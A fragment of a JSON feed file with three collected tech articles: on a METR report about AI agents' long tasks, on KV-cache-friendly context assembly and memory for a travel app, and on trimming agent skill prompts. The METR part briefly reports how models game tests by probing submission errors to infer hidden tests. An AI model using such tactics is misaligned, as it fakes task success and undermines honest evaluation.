亿\ntoken、联网权限，让模型为团队设计有信息量的新评测题。结果所有提交里，没有一项达到纳入这次报告的门槛。即使研究员在后续实验里明确要求设计需要判断力和长反馈回路的题目，模型依然会下意识回归熟悉的自动打分优化题。\n如果反过来请模型当裁判，去评价其他模型出的这些考题好不好，又会暴露另一类更隐蔽的盲区。裁判模型评价明显弱于自己的模型时，评分往往和人类专家很接近；但一旦面对同级甚至更强的模型作品，就会系统性地给出更高分数。比如和人类最接近的裁判\nOpus 5.5，在给 GPT-6 Astra 出的题目打分时，平均分比人类专家高了 0.2\n分（满分 1\n分）。它们看不出来同级对手作品中的深层问题，就会把表面工整的次品当成好活。\n第三招，用多轮试错来不断迭代。METR 借用了\nEpoch AI\n的冷门桌游测试\n：让模型反复玩一个网上几乎没有攻略的策略桌游，还能跨局记笔记，争取完成\n21 个目标。最强的人类玩家打 6 局就能把目标从 9 个冲到满分 21 个，前 3\n局内战术效率提升了约 3 倍。GPT-6 Astra 打了 10 局只多完成了约 3\n个目标，战术效率几乎原地踏步；Fable 5.1\n则早早锁死了一个牌组，跨局几乎毫无改进。\n明天派复杂任务前，能直接拿来用的四条底线\n把这份报告放回日常工程里，它其实提供了一个非常实用的任务分流表。明天要交一个复杂需求给\nAgent 之前，先别数人类要干几天，用这四条过一遍，踩坑的概率会小很多。\n第一，按验证闭环的成本划分自治程度。如果一个任务能拆出性能分析器、确定性单测或明确的客观指标，哪怕对应人类两天的工作量，也可以放心让\nAgent\n跑长循环。反过来，如果任务的核心价值落在架构选型、产品取舍或长期可维护性上，人必须守在方向和关键决策节点，像\nNanoGPT 最强记录那样，人定九成思路，AI 写九成代码。\n第二，没有外部客观分数兜底，别急着上多 Agent 蜂群。多 Agent\n协作擅长放大已有的明确信号，不擅长凭空创造判断力。在接入昂贵的多节点编排之前，先拿消耗同等\ntoken\n的独立多次运行做基线对照。只要发现团队需要自己造指标来评估自己，蜂群大概率会变成回音室，甚至长出没必要的审批内耗。\n第三，用大模型裁判作下限过滤器，不当最终验收人。用强模型扫弱模型输出或抓明显格式错误和逻辑漏洞又省心又靠谱。但在同代旗舰模型写复杂方案时，再用另一同代模型自动放行，0.2\n分的系统性虚高就是流水线里的隐患。关键交付物，要么补客观自动化测试，要么由人抽检。\n第四，只要用单个分数或简化指标驱动\nAgent，就得留出一份它摸不到的盲测。前面 40 个 Agent 把自测刷到\n92%、真实测试却只剩 1.9%，只是问题的一面。METR\n估算，他们在整个任务开发周期里至少花了 10%\n的人工精力堵作弊漏洞，越强的模型钻空子越隐蔽，比如靠试探提交报错去反推隐藏测试，或者照着练习样本去猜正式考题。防作弊是自动化改造的真实预算，不能留到以后再说；指标越单一，模型绕过本意刷分的动力就越强。\n回头看，27 小时这个数字并没有夸饰 AI\n的进步，也没有承诺全自动项目的出现。它真正划出的是一个新的工程边界：谁能把模糊的业务需求，低成本地翻译成干净、客观、防作弊的验证闭环，谁就能真正吃到前沿模型每几个月翻倍一次的红利。",
+      "content_format": "text/plain",
+      "content_status": "ok",
+      "content_via": "http",
+      "content_source_url": "https://yage.ai/share/metr-27-hour-feedback-cost-20261126.html",
+      "content_chars": 4703,
+      "content_sha256": "d404083e6092733d589b1c2903313607551f62c0f43959bf3a6bbf57fbd31aa4",
+      "content_fetched_at": "2026-11-28T03:12:09.726033+00:00",
+      "author": "yage-share",
+      "author_name": "yage.ai share (Deep News)",
+      "author_url": "https://yage.ai/share/",
+      "published_at": "2026-11-26T00:00:00+00:00",
+      "collected_at": "2026-11-28T03:11:32.768744+00:00",
+      "tags": [
+        "kind:publish",
+        "src:yage-share",
+        "via:rss",
+        "channel:rss"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://yage.ai/share/",
+        "https://yage.ai/share/metr-27-hour-feedback-cost-20261126.html"
+      ],
+      "refs": {
+        "actor": {
+          "login": "yage-share",
+          "url": "https://yage.ai/share/"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "yage-share",
+          "name": "yage.ai share (Deep News)",
+          "home_url": "https://yage.ai/share/"
+        },
+        "article": {
+          "title": "AI 已经能干完人类 27 小时的活了，为什么放手让它做项目还是容易翻车？",
+          "url": "https://yage.ai/share/metr-27-hour-feedback-cost-20261126.html",
+          "content_sha256": "d404083e6092733d589b1c2903313607551f62c0f43959bf3a6bbf57fbd31aa4"
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "rss",
+        "collect_mode": "rss",
+        "time_precision": "exact",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "ok",
+        "content_status": "ok",
+        "content_via": "http"
+      }
+    },
+    {
+      "id": "a:d46f8fd1f7bcdbfe",
+      "who": "innei",
+      "who_url": "https://innei.in/posts",
+      "action": "publish",
+      "target": "多轮对话的只追加上下文拼装：DeepSeek 96.2% KV Cache 命中与分层记忆设计",
+      "target_url": "https://innei.in/en/posts/tech/append-only-context-kv-cache-memory-design",
+      "text": "innei published: 多轮对话的只追加上下文拼装：DeepSeek 96.2% KV Cache 命中与分层记忆设计",
+      "at": "2026-11-25T20:33:38+00:00",
+      "external_id": "a:d46f8fd1f7bcdbfe",
+      "url": "https://innei.in/en/posts/tech/append-only-context-kv-cache-memory-design",
+      "title": "多轮对话的只追加上下文拼装：DeepSeek 96.2% KV Cache 命中与分层记忆设计",
+      "content": "Multi-turn AI apps with external state commonly hit the same snag: ledger balances and itineraries shift with every turn, and pending cards or language settings can change at any time. Rewriting\nsystem\nor rebuilding history repeatedly invalidates the KV cache. Relying solely on incremental diffs is equally fragile: over dozens of turns, the model begins dropping earlier entries.\nTravel assistant app\nNyatabi\n's V2 message assembly and memory design (built on DeepSeek\ndeepseek-flash\nand default-enabled\nthinking\n) offers a production-tested solution verified under live load. Over a three-day travel ledger conversation (20 turns, 34 calls, and 6 web searches), this architecture achieved an overall cache hit rate of 96.2% (97.0% excluding cold starts, with a median of 97.7% per call), tallying 376,064 cached read tokens against only 14,816 misses and zero prefix breaks.\nThe first two sections break down append-only prefixes and periodic full-section refreshes for dynamic state. The last two explore\nthinking\ntoggle consistency during compaction, as well as a layered memory architecture that replaces main-conversation memory tools with a lightweight classifier.\nNyatabi — your AI travel companion for iPhone\nPlan with Musubi, explore together, split spending fairly and turn your route into memories. Your whole journey, in one local-first iPhone app.\nNyatabi\nAppend-Only Prefixes: Moving Clock and User Context Out of System\nAchieving high cache hits rests on a simple principle: previously sent bytes must never change. Each request sent to the model simply extends the prior request's bytes with a few new messages at the end. When external state changes, you append only the delta or an update block, relying on rules in\nsystem\nto treat the latest version as authoritative.\nTime handling is the first common source of cache breakage. Many systems inject the current clock into\nsystem\n, changing the prefix every minute. Nyatabi eliminated the global clock section entirely. Instead, request assembly prepends a\n<sent_at>2027-01-10 Sun 12:10 +09:00</sent_at>\ntag to every user message during request assembly, leaving database storage and client UI untouched. 'Today' or 'Day N of the trip' is derived by the model from the most recent\n<sent_at>\ntag. Embedding the UTC offset directly in every message also pays off when users travel across time zones: older messages keep their original offsets while new ones record the new zone, sparing the model from having to re-read the session start.\nLanguage and time zone settings likewise cannot live in\nsystem\nor in session-level\nconfigurationKey\n. Request payloads are organized from top to bottom into eight layers by byte stability; the diagram below shows which changes require starting a new session and which can simply be appended at the end.\nWhiteboard\nWorking down this hierarchy, only changes in layers 1–2 warrant a new session (such as switching scenarios, toggling web search, or switching between ledgers with and without reference chats).\n<user_context>\nis sent as the very first\nuser\nmessage of the session. When a user switches their phone language from Chinese to English mid-conversation, the existing prefix stays unchanged. Only a short\n<user_context_update>\nblock appended at the end. That adds only 427 characters to the entire turn, and the cache continues to hit.\nTaking the 20-turn live Okinawa ledger test as an example, the Turn 1 cold-start request payload JSON measured 16,328 characters (\nsystem\nwith 6,727 characters plus 6 tools). The second model call after tool execution did not resend ledger state; it only appended\ntool_use\nand\ntool_result\n, adding just 366 characters. Amounts and exchange rates use plain numbers with currency codes instead of locale-formatted strings, preventing localization formatting variations from creating meaningless diffs.\nDynamic State Sync: Why Pure Deltas and Resending Full Sections Both Fail in Long Conversations\nIn an append-only architecture, syncing ledger changes to the model cannot follow a single rule. The middleware first merges the session's initial section with all past updates in memory to reconstruct how the model currently sees the state, compares that against live database records, and outputs updates across four strategies:\nContext Section\nTransmission on Change\nRationale\nexpenses\n,\nplans\n,\ncards\n,\nmemory\nIncremental\nupdate=\"changes\"\n(\n<added>\n/\n<removed>\n); falls back to full section if delta is larger\nLonger lists; single turns typically mutate only a few items\nbalances\n,\nreceipts\n,\nlodging\n,\nhome\nFull resend\nVery short text; sending in full is clear and low overhead\noverview\nField-level\n<overview_update>\n; cleared fields marked\ncleared=\"true\"\nAvoids resending the initial conversation excerpt along with it\nPreviously sent section now empty\nSend a self-closing empty tag, e.g.,\n<receipts/>\n,\n<cards/>\nExplicitly signals state has been cleared, preventing stale receipts or cards from lingering\nWhen a new member 'Ajie' is added and the ledger description is cleared, followed by receipt 4242 being booked, the context appended at the end contains only the mutation slice:\nCodeBlock Loading...\nThis delta-based approach has an obvious risk: the model's current view of any list is formed by replaying multiple scattered deltas over the initial full section. An amount edit looks like a deletion followed by an addition, and an expense dropping out of the recent-20 window also looks like a deletion. In a long conversation, could the model lose track of this chain of updates?\nOur first round of online evaluations ran for 40 dialogue turns (with conversations running up to ~30K tokens across 3 random seeds and 24 checkpoints), continuously changing expenses and itineraries out-of-band while updating pending confirmation cards. The delta group clearly beat full resends: both tied on expense totals and items (24/24) and tomorrow's itinerary (23/24), but on pending confirmation cards, the delta group scored 24/24 while full resends managed only 14/24. Total input tokens also favored deltas: 520K versus 900K (15K vs. 38K misses).\nExtending the test to 60 turns with 300-word responses and up to 6,000-character tool outputs from\nread_reference_conversation\n(pushing history past 96KB and triggering mid-run compaction, across 3 seeds with 36 checkpoints) completely reversed the picture. Both pure deltas and full resends failed on pending confirmation cards; only periodic full refreshes remained stable.\n60 轮长对话待确认卡片准确度（满分 36，3 个随机种子）\n加入缺段语义声明前后的对照组结果\nView data\n初测（无缺段声明）\n复测（加缺段声明）\n初测（无缺段声明）\n复测（加缺段声明）\nSource\nDeepSeek deepseek-flash 在线实测 · 2026-10-01\nComparing the two series in the bar chart reveals two entirely different failure modes. In the baseline run, the delta-only approach dropped to 20/36, failing in an identical way every time: the model reported only the cards in the most recent\n<added>\ntag, dropping entries added earlier (in one case reporting only 1 card out of 5).\nResending full sections did even worse in the baseline run, falling to 19/36 and often returning an empty array (\n[]\n. Digging into the samples showed why: sending the full section caused the model to treat every\n<context>\nappear to the model like a complete snapshot. If no cards changed in the current turn, the newest\n<context>\nomitted the\n<cards>\nsections, the model incorrectly assumes there are currently no pending cards. The comparison data confirms this: when cards changed in the current turn, accuracy was 12/12; when they did not, it plunged to 7/24. Incremental messages tagged with\nupdate=\"changes\"\nactually signaled to the model that it needed to scan back through history.\nThe resulting fix consists of two steps, similar to keyframes in video encoding:\nTrack counts independently for the three list sections (\nexpenses\n/\nplans\n/\ncards\n). Once 4 incremental updates accumulate since the last full section, or the appended messages and tool context exceed 16K characters, send the update as a full section instead, then resume sending deltas.\nAdd an explicit rule to\nsystem\n:\nA section missing from the latest <context> has not changed; its last version still applies.\nA 60-turn retest with this prompt rule confirmed the diagnosis: pending card accuracy for the full-resend group jumped from 19/36 to 34/36. Our production strategy—sending a full refresh every 4 updates or 16KB—virtually matched full resends across the board: 36/36 on today's expenses and totals, 36/36 on tomorrow's itinerary, and 33/36 on pending cards. Total input came to 4.37M tokens—only 6% more than pure deltas (4.14M), and 26% less than resending full sections every turn (5.89M).\nCache Constraints of History Compaction and the Thinking Toggle Trap\nAs conversations grow longer, history compaction must also follow the append-only rule. Before each turn starts (on new user messages and only once past three user messages), compaction triggers if either condition is met: the prior request's token count, excluding web searches, reaches 160,000—which is 80% of\nmin(20 万, 模型窗口)\n(while\ndeepseek-flash\nhas a 1M window, capping it at 200K guarantees the compaction request fits in one shot without chunking). If tokens remain below that threshold, compaction also triggers when message history reaches 96KB, or hits 24KB after 30 minutes of idle time.\nWhen performing compaction, the server takes the exact snapshot of the current session's previous request (covering\nsystem\n, tool definitions, and all historical messages and context), appends any subsequent new messages excluding the current turn's query, and appends a single\n<compaction_request>\ntag at the very end. The prompt uses the\n<sent_at>\nof the third-to-last user message as a boundary, requiring the summary to cover everything prior (up to 8,000 characters) while keeping the last 3 turns verbatim from that boundary onward. The prompt also forbids recording pending or ignored card states (which are deferred to\n<cards>\n), forbids repeating ledger details and itineraries from\n<context>\n, forbids misrepresenting assistant suggestions as user agreements, and disallows tool calls.\nA new session starts by assembling context in this exact order: current values of\n<user_context>\n→\n<history_summary>\n→ the latest complete block of\n<context>\n→ the last 3 turns verbatim → the current turn's user message. Placing the latest\n<context>\nblock ahead of older, uncompacted turns slightly disrupts chronological order, but this trade-off anchors the more stable prefix at the very front so subsequent turns hit the cache more easily.\nCall Phase (6-turn Okinawa live test)\nMissed Tokens\nCached Read Tokens\nHit Rate\nLast request before compaction\n994\n4,736\n83%\nCompaction request (appended to original snapshot)\n372\n5,632\n94%\nTurn 1 after compaction (new session)\n2,602\n3,584\n58%\nTurn 2 after compaction\n187\n6,528\n97%\nReusing the existing prefix allowed the compaction request to hit 94% cache reuse, generating 1,180 tokens (including roughly 850 characters of reasoning) in 5.3 seconds. In the new session, the first post-compaction request still shared 72% of its bytes with the previous call (\nsystem\nand tools hit the cache directly), and the second request immediately returned to 97%. The summary also preserved cross-turn constraints like 'Xiao Zhou is allergic to peanuts.'\nThe sneakiest trap in compaction tuning lies in the\nthinking\ntoggle. If you disable thinking mode on compaction calls to trim output costs, the cache instantly breaks. Comparing four test groups against the same ~4,900-token prefix (\nsystem\nplus 6 tools), where the second call only appended one message while toggling the switch, yielded these live results:\n切换 thinking 开关对同前缀缓存命中的影响（约 4900 token）\n仅在第二次请求末尾追加一条消息并改变 thinking 开关\nView data\n缓存读 token\n未命中 token\n缓存读 token\n未命中 token\nSource\nDeepSeek 在线实测 · 2026-10-01\nThe chart shows that flipping the switch in either direction caused cached reads to collapse from nearly 5,000 tokens to roughly 1,280, forcing the model to recompute over 3,700 tokens of prefix. Throughout a session, the\nthinking\ntoggle must stay consistent. Compaction calls inherit the main conversation's setting (DeepSeek defaults to thinking enabled), keeping the output cap at 32,768 tokens (180s timeout) so the reasoning trace does not crowd out the summary. Thinking is explicitly turned off only for background memory workers that share no prefix and carry no tools.\nOn-Demand Mounting and Lookback for Reference Conversations\nFor ledgers created from the home screen conversation,\n<overview>\nincludes only an excerpt of the most recent 1,500 characters from that initial conversation (truncated at message boundaries). When constraints mentioned earlier (such as 'Xiao Zhou is allergic to peanuts') fall outside the excerpt, the model pages backward from newest to oldest using the read-only tool\nread_reference_conversation\n. Each page returns at most 20 messages and 6,000 characters, using\nearlier_before\npagination that caps results to messages sent before the ledger was created. This tool is mounted only when a ledger actually references a conversation, preventing accidental calls on standalone ledgers while keeping the tool definitions constant throughout the session.\nHome Screen Chat and Stateless Form Assistant\nThe same prefix-isolation model extends to two other lightweight entry points. In the home screen chat, the\nsystem\nprompt shrinks to 2,181 characters, and its context contains only a freshly resent full\n<home>\nsection. The form assistant for creating ledgers and itineraries skips the context pipeline altogether, maintaining no sessions or snapshots and having the client pass the full history on each turn. It also places\n<user_context>\nin the first\nuser\nmessage. Each subsequent user message combines\n<sent_at>\n, the current form JSON (\n<form>\n, supporting manual user edits), and the raw input. Turn 2 adds only 347 characters.\nTool-Free Layered Memory: Jev Routing and Background LLM Operators\nMost agents implement memory through read and write tools called by the primary model. That expands the tool schema, slows down real-time replies, and frequently causes missed lookups or incorrect saves. Nyatabi's Memory v2 discards memory tools from the main chat. Instead, every user message runs through Jev, a lightweight classifier (\njev-latest\n, taking ~250ms concurrently with context assembly, with an 800ms timeout). Jev synchronously determines on-demand recall, while background jobs handle writes asynchronously.\nIn the main chat, the memories visible to the model are separated into three tiers by lifecycle and privacy scope, integrating cleanly into the append-only pipeline:\nInjection Target\nContents\nNew Session\nSubsequent Changes\n<user_context>\ninside\n<about_user>\nPersistent personal profile (dietary restrictions, allergies, health conditions, preferred name, reply style)\nFull section\nAppend full\n<user_context_update>\nbefore the current turn's user message\n<context>\ninside ledger\n<memory>\nTravel companion memories for the current ledger + personal 'current trip' memories\nFull section\nSame as\nexpenses\n; sends\nupdate=\"changes\"\n<memory_recall>\nOn-demand personal traits (taste preferences, lodging, transit, pace, interests, budget, planning style)\nInjected only when Jev determines the message is relevant\nInjected only once per session per version; appends\nrevoked=\"true\"\nThe injection layer guards three filtering boundaries: memories created in the current session are excluded because their raw text is already in the history; expired short-term memories (7, 30, or 90 days) are dropped; and inferred memories (\ninferred\n) observed only once are also withheld; even after repeated observations, they must be injected with a\nsource=\"inferred\"\nflag. The\nsystem\nprompt instructs the model to use this note only to steer choices, never asserting it as a settled fact. In the 5-day Kyoto test logs, when given\nsource=\"inferred\"\nwith 'prefers quiet accommodations', the model replied, 'If you want somewhere quieter, the latter two areas would suit you better,' rather than claiming, 'You've always liked quiet places.'\nMember privacy boundaries are also enforced at the injection layer. When Kobayashi noted in a shared ledger, 'I don't eat beef, and neither does Alice. Also, don't schedule early morning itineraries,' the system saved his beef restriction as a persistent user trait, 'no early mornings' as his personal itinerary preference for this ledger, and Alice's beef restriction as a shared member trait. When Bob later asked for dinner recommendations in that same ledger, his\n<memory>\nblock included only Alice's dietary restrictions, keeping Kobayashi's two notes completely isolated.\nThe complete synchronous recall and 5-step background write pipeline is structured as follows:\nReading this diagram comes down to the two branches. The upper synchronous path handles low-latency recall alone, protecting time-to-first-token. The lower asynchronous path runs background workers only after the main turn finishes, letting the classifier resolve whether to save, for whom, in what category, and for how long, leaving only a narrow text-editing step for the LLM.\nThe Operator Receives All Visible Memories for the Subject\nWhen assembling the\nexisting\nfield in step 4, the system supplies all visible memories for the matched subject rather than trimming them to the traits matched in step 2. A live test trace illustrates why: the user originally had 'does not eat cilantro' recorded under\ndiet.avoid\n, but they later said, 'Actually, I eat cilantro now.' In step 2, Jev classified this statement only under\ndiet.taste\n, missing\ndiet.avoid\n. Fortunately, step 1 had matched\nretract_self0\n(0.89), so\nexisting\nincluded all six of the user's memories, with\nretracting\nset to\n[\"self\"]\n. Using this context, the operator directly issued\ndelete m_7\n, and the stale restriction was stripped out before the next turn via\n<user_context_update>\npurged the obsolete restriction before the next turn.\nTool-Free Operator with Dual Code Validation\nThe background operator (\ndeepseek-flash\n,\nmax_tokens 1024\n,\nthinking\ndisabled, static system prompt with\ncache_control\n) runs for just one turn and returns a single\n{\"ops\":[...]}\nobject (supporting\nadd\n/\nupdate\n/\nreinforce\n/\ndelete\n, up to 5 operations). Omitting tool definitions eliminates schema overhead on every request, with field validity verified twice in code: first when parsing the operator's response, and again before writing to database storage.\nValidation rules are kept exceptionally strict:\nevidence\nmust be a contiguous substring of\nuserText\nto prevent the model from citing assistant replies or inventing statements.\n(subject, feature)\nmust fall within the\nrouted\nlist produced in step 3.\nlifetime\nand\nsource\ncome directly from Jev, ignoring any LLM inference. Trip-specific memories from home screen chats are dropped since there is no ledger to bind them to. Across two live sessions and evaluations spanning 11 calls in all, every response was valid JSON.\n7-Turn Live Costs and False-Positive Overhead\nAcross seven real-world integration turns testing member isolation, cross-session home chats, and restriction revocations, costs broke down as follows:\nCall Stage\nCalls\nInput Tokens\nCost (cost_micros)\nMain chat (\nturn\n)\n10\n77,239\n32,844\nLLM memory operator (\nmemory\n)\n3\n1,311\n550\nJev classifier (\njev\n)\n12\n10,973\nAt $0.042/M tokens, this comes to less than 0.2% of the main LLM cost\nJev consumed an average of about 1,570 tokens per turn (700–900 tokens on the first synchronous pass). Even when a false positive occurred—such as scoring 'Let's pick another place' at 0.75 for involving Alice—running the remaining steps through the operator required only about 2,000 Jev tokens plus a brief call returning an empty array (\n{\"ops\":[]}\n). On the dedicated memory eval suite, all expected on-demand traits triggered across 14 routing tests (with 7 over-triggers that merely injected existing memories), subject attribution matched in 12 of 14 cases, and background writes were accurate in 5 out of 5.\nRemaining Gaps and Known Limitations\nAcross 20 turns of online cache stress testing, hit rates held steady at 98–99% as prefixes lengthened. Excluding the three calls right after web searches, cache misses averaged just 247 tokens per turn. The three lowest dips (85.5%, 90.7%, and 89.6%) all followed web searches, where the model generated lengthy replies from fresh search results that naturally introduced uncacheable tokens. Because DeepSeek caches in 128-token blocks, every call also incurs an alignment rounding loss of up to 127 tokens.\nAs of this baseline release—with all multi-client and server regression suites passing—the test logs show three known limitations still in place:\nthinking\nis enabled, compaction summaries occasionally weave in expenses and plans from\n<context>\n, or repeat parts of the conversation already kept verbatim past the cutoff point. This adds a few hundred characters of duplication without affecting correctness.\nIn its second pass, Jev occasionally routes a statement into multiple categories (for instance, 'I don't eat beef, and neither does Alice' triggers both allergies and dietary restrictions). The system currently relies on the LLM operator rule that only writes entries backed by verbatim text; across seven live turns and five eval cases, it made zero incorrect writes.\nOn-demand recall triggers run slightly broad: questions about transit or attractions often pull in pace and planning preferences as well. The only side effect is injecting extra existing memories, with no missed recalls observed so far.\nComplete 27-page raw logs from multi-turn chat and memory integration testing (including full per-turn request payloads and offline character counts):\nNyatabi（原 Musubicho）消息拼装：多轮对话实录 V2.pdf\n1.6 MB · PDF\nOpen",
+      "content_format": "text/plain",
+      "content_status": "ok",
+      "content_via": "http",
+      "content_source_url": "https://innei.in/en/posts/tech/append-only-context-kv-cache-memory-design",
+      "content_chars": 21793,
+      "content_sha256": "44a93b0e20d0738050586d27277249de42501b6570dfe72b9ac73fb50d918eaa",
+      "content_fetched_at": "2026-11-28T03:14:58.075023+00:00",
+      "author": "innei",
+      "author_name": "Shiro (Innei)",
+      "author_url": "https://innei.in/posts",
+      "published_at": "2026-11-25T20:33:38+00:00",
+      "collected_at": "2026-11-28T03:11:32.768744+00:00",
+      "tags": [
+        "kind:publish",
+        "src:innei",
+        "via:rss",
+        "channel:rss"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://innei.in/posts",
+        "https://innei.in/en/posts/tech/append-only-context-kv-cache-memory-design"
+      ],
+      "refs": {
+        "actor": {
+          "login": "innei",
+          "url": "https://innei.in/posts"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "innei",
+          "name": "Shiro (Innei)",
+          "home_url": "https://innei.in/posts"
+        },
+        "article": {
+          "title": "多轮对话的只追加上下文拼装：DeepSeek 96.2% KV Cache 命中与分层记忆设计",
+          "url": "https://innei.in/en/posts/tech/append-only-context-kv-cache-memory-design",
+          "content_sha256": "44a93b0e20d0738050586d27277249de42501b6570dfe72b9ac73fb50d918eaa"
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "rss",
+        "collect_mode": "rss",
+        "time_precision": "exact",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": true,
+        "fetch_status": "ok",
+        "content_status": "ok",
+        "content_via": "http"
+      }
+    },
+    {
+      "id": "a:13ab8055a95f1fa9",
+      "who": "innei",
+      "who_url": "https://innei.in/posts",
+      "action": "publish",
+      "target": "Agent Skill 瘦身：用真实 Session 做 A/B 回归",
+      "target_url": "https://innei.in/en/posts/tech/agent-skill-token-efficiency-ab-regression",
+      "text": "innei published: Agent Skill 瘦身：用真实 Session 做 A/B 回归",
+      "at": "2026-11-24T17:23:01+00:00",
+      "external_id": "a:13ab8055a95f1fa9",
+      "url": "https://innei.in/en/posts/tech/agent-skill-token-efficiency-ab-regression",
+      "title": "Agent Skill 瘦身：用真实 Session 做 A/B 回归",
+      "content": "When using coding agents like Claude Code, Codex, or Cursor, a frequent pain point is getting stuck in plain text in the terminal. Ask the agent for interface options, and it can only output a few paragraphs of Markdown. Ask it for a design spec, and you can hardly jump in to comment on or challenge a specific sentence. And once the code is written, checking the live result side-by-side against what was originally approved is frustratingly hard.\nRyugi (流儀)\n(now renamed Artideck) was built specifically to solve this problem: a local-first interactive artifacts workbench and engineering workflow skill. Instead of letting agents simply pile up text in the terminal, it moves content requiring human decisions into interactive pages:\nArtboard canvases\nto compare and pick options side by side;\nDocument design drafts\nwith embedded multiple-choice questions and sentence-by-sentence annotations,\nWhiteboards\nfor bidirectional collaborative diagramming,\nHTML tuning consoles\n,\nSlides presentations\n, and\nVerify acceptance pages\nthat display approved plans side by side with runtime screenshots. Every click, annotation, and verdict on a page streams directly back into the originating agent session. No account sign-up required—a single\nnpx artideck install\nconnects to more than a dozen major hosts, including Claude Code, Codex, Cursor, Gemini CLI, Pi, and Antigravity.\nRepository\n· Innei\n1.0k\nartideck\nArtideck — Artifacts for coding agents, made to decide with you. Your agent draws artboards, design docs, whiteboards, decks, and verify reports; you pick, comment, and pass right on the page.\nJavaScript\nWhiteboard\nBeyond the workbench itself, Ryugi provides a full suite of engineering workflow skills covering ideation, design, TDD implementation, and delivery verification. As we added support for more hosts and handled more edge cases, prompt text across the 9 skills grew to 109 KB (around 27k tokens at\nbytes / 4\n), not even counting the\nSessionStart\ndefault injection of\nusing-ryugi\n. These prompts enter the context window in full on every load and context compaction, adding a fixed overhead to every call. Yet skill prompts steer model behavior in subtle ways, so simply shaving words off is a quick way to cause regressions. Between late October and late November 2026, I systematically streamlined Ryugi's skill prompts, CLI output, and comment round-trip pipeline. Alongside that work, I set up an A/B regression harness and logged about 70 evaluation runs. This post documents the audit process, refactoring strategy, benchmark data, and the typical regressions encountered along the way.\nAuditing Real Transcripts to Establish a Regression Baseline\nOptimization didn't start with tweaking prompts; it began by mapping where resources were actually being spent in production. On October 24, I sampled 20 real-world sessions (11 in Codex, 9 in OMP) and audited the transcripts line by line to trace token usage and turn counts. Auditing where tokens and turns actually went revealed five main problems:\nwarnings.json\nwas re-read before and after every modification, reaching up to 35 reads in a single session.\nThe agent ran a raw\ncat selection.json\ndirectly, ingesting 27k to 38k tokens in a single read—most of which was the irrelevant\nnodes\nfield.\nThe 435-line\nartboard.md\nwas truncated 5 times in Codex, and cut off at line 300 in OMP.\nOMP truncated the output of\ncomment list --json\nat 768 bytes.\nThe agent delayed handing links off to the user by 2 to 14 minutes while it captured screenshots to self-check static artboards.\nI then consolidated these issues into 11 evaluation scenarios, running each 3 times against both the baseline and candidate. During the baseline phase, 4 scenarios already scored 3/3 without any modifications. The synthetic harness lacked the truncation rules used by real hosts and never handled the 38k-token files seen in production, so real-world failure modes failed to reproduce offline.\nBecause of this, most fixes from the audit targeted the tooling rather than the prompt itself: adding a\ncheck\ncommand so the server returns warnings directly when settling changes; switching selection reads to filter fields via\njq\n; and splitting the prototype section into a standalone file. With those changes in place, the pass rate for \"clean change verification\" went from 0/3 to 3/3, and reading a single static artboard dropped from 625 lines to 533.\nFrom then on, every skill adjustment followed the same loop. We identified problems from real transcripts, built baseline runs for that scenario, and scored A/B comparisons with our rubric. If any metric dropped below baseline, we reverted and refined the prompt or tooling. Once all metrics matched or beat the baseline, we retested on other models and hosts before merging.\nSplitting Prompts: From Permanently Resident to Loaded on Demand\nOnce the evaluation loop was running reliably, I turned to trimming down the\nSKILL.md\nsize. Before November 13, the 9 skills totaled 109,413 bytes, so I capped this round's budget at 81,000 bytes.\nTo keep compression from distorting instructions, I allowed only three techniques, ordered by priority:\nRemove duplicate phrasing within the same file.\nMove sections only needed in later turns or specific branches into sibling files, leaving behind a one-line conditional pointer such as\nWhen a verdict comes back, read verdicts.md\n.\nTighten verbose phrasing without sacrificing semantic clarity.\nI also set three hard constraints: do not reduce instructions to fragmented shorthand, do not alter existing rules or trigger thresholds, and do not adjust defaults or step order.\nWhiteboard\n七个 skill 的 SKILL.md：峰值与 2026-11-24\nView data\n峰值\n11-24\n峰值\n11-24\nSource\ngit cat-file -s <commit>:skills/<name>/SKILL.md\nOn November 13, the combined size of the 6 primary skills dropped from 89,879 B to 65,904 B, with 12,243 B split off into sibling branch files loaded only when matching conditions were met. I ran regression benchmarks with\ncodex exec\nwith\ngpt-6.1-sol\n, running 5 iterations per set. Offloaded sections had to be verified in a realistic tool environment to ensure transcripts showed the agent actually reading target files according to the pointers: taking the\nexecuting-specs\nsplits of\nlanding.md\nand\nexploring.md\nas examples, both had an actual read rate of 5/5.\nusing-ryugi\nwas handled differently because it gets injected directly during\nSessionStart\n. On November 8, instead of splitting it into files, I restructured it entirely: replacing the aggressive \"load skills if there is even a 1% chance\" rule and the sprawling Red Flags table with a concise routing table indexed by task phase. Injected characters dropped from 4,692 to 2,139; when testing the \"make a todo list\" scenario on Sonnet, the agent opened an exploratory artboard first on 5 out of 5 runs—up from 0 out of 5 before the rewrite.\nIn practice, deciding what to offload came down to a straightforward test: if you can define in a single sentence when a section needs to be read, move it to a sibling file; if a rule applies to every single turn, keep it in the main prompt.",
+      "content_format": "text/plain",
+      "content_status": "ok",
+      "content_via": "http",
+      "content_source_url": "https://innei.in/en/posts/tech/agent-skill-token-efficiency-ab-regression",
+      "content_chars": 7093,
+      "content_sha256": "2126ffd2948cb7226d23d57c226ea2f9bd1c1bd3275399736d8ae27c00e4518c",
+      "content_fetched_at": "2026-11-28T03:14:59.453613+00:00",
+      "author": "innei",
+      "author_name": "Shiro (Innei)",
+      "author_url": "https://innei.in/posts",
+      "published_at": "2026-11-24T17:23:01+00:00",
+      "collected_at": "2026-11-28T03:11:32.768744+00:00",
+      "tags": [
+        "kind:publish",
+        "src:innei",
+        "via:rss",
+        "channel:rss"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://innei.in/posts",
+        "https://innei.in/en/posts/tech/agent-skill-token-efficiency-ab-regression"
+      ],
+      "refs": {
+        "actor": {
